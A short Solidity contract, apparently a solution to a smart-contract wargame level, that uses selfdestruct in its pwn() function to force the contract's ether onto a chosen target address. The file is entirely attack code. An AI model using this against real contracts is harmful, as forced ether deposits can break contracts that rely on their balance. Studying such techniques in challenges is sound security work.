// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    address target;

    constructor(address _target) payable {
        target = _target;
    }

    function pwn() external {
        selfdestruct(payable(target));
    }
}
